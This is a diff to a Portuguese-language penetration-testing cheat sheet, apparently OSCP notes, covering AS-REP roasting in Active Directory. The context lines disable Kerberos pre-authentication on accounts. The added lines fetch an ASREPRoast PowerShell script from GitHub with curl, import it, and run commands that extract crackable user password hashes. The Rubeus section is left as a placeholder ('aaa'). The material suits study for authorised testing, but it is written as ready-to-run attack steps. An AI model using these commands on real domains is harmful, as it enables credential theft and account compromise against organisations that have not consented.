@@ -417,8 +417,20 @@ SE ACHAR, PODE DESABILITAR O KERBEROS PREAUTH MANUALMENTE
 Set-DomainObject -Identity test4 -XOR @{useraccountcontrol=4194304} -Verbose
 Set-ADAccountControl -Id kamisama -DoesNotRequirePreAuth:$true
 ```
-
-
+##### KERBEROASTING-ASREP - OBTER O HASH DE USUARIOS USANDO SOMENTE POWERSHELL
+```
+curl https://github.com/n0ts0cial/oscp/raw/main/ASREPRoast.ps1 -Outfile ASREPRoast.ps1
+import-module .\ASREPRoast.ps1
+Get-ASREPHash -Username test3 -Verbose
+```
+```
+$FormatEnumerationLimit=-1
+Invoke-ASREPRoast -Verbose | Out-String -Width 4096
+```
+##### KERBEROASTING-ASREP - OBTER O HASH DE USUARIOS USANDO RUBEUS
+```
+aaa
+```
 # POWERSHELL
 ## DOWNLOAD
 ##### POWERSHELL - DOWNLOAD AS STRING
